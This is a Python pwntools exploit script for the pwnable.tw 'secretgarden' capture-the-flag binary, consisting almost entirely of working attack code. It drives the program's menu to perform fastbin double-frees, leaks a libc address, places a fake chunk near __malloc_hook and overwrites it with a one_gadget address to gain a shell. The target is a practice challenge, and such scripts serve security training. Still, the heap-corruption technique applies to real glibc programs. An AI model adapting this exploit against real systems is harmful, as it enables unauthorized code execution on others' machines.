from pwn import *


io = process('./secretgarden', env={"LD_PRELOAD":"./libc_64.so.6"})
#io = remote('chall.pwnable.tw', 10203)
libc = ELF('./libc_64.so.6')

def malloc(size, name, color):
    print(io.recvuntil(b'Your choice : '))
    io.sendline(b'1')
    print(io.recvuntil(b'Length of the name :'))
    io.sendline(str(size))
    print(io.recvuntil(b'The name of flower :'))
    io.send(name)
    print(io.recvuntil(b'The color of the flower :'))
    io.sendline(color)

def free(index):
    print(io.recvuntil(b'Your choice : '))
    io.sendline(b'3')
    print(io.recvuntil(b'Which flower do you want to remove from the garden:'))
    io.sendline(str(index))
	
def view():
    print(io.recvuntil(b'Your choice : '))
    io.sendline(b'2')

def free_all():
    print(io.recvuntil(b'Your choice : '))
    io.sendline(b'4')


malloc(40, b'A', b'B') #0
free(0)
malloc(256, b'OK', b'OK') #1
malloc(40, b'A', b'B') #2
free(1)
free(0)
free(2)
free(0)
view()
print(io.recvuntil(b'Name of the flower[1] :'))
libc.address = u64(io.recv(6)+b'\0\0') - 0x3c4b78
log.info('LIBC ADDRESS: ' + hex(libc.address))
malloc(10, b'A', b'B') #3
free(3)
malloc(10, b'A', b'B') #4
malloc(10, b'A', b'B') #5
malloc(10, b'A', b'B') #6
malloc(10, b'A', b'B') #7
malloc(50, b'A', b'B') #8
malloc(50, b'A', b'B') #9


malloc(0x70, b'A', b'B') #10
malloc(0x70, b'A', b'B') #11
free(10)
free(11)
free(10)
malloc(0x70, p64(libc.address+0x3c4b10-35), b'D')
print(hex(libc.address+0x3c4b10-35))
malloc(0x70, b'A', b'D')
malloc(0x70, b'B', b'D')
malloc(0x70, b'A'*19+p64(libc.address+ 0xf0567), b'D')
malloc(0x70, b'A'*19+p64(libc.address+ 0xf0567), b'D')
pause()
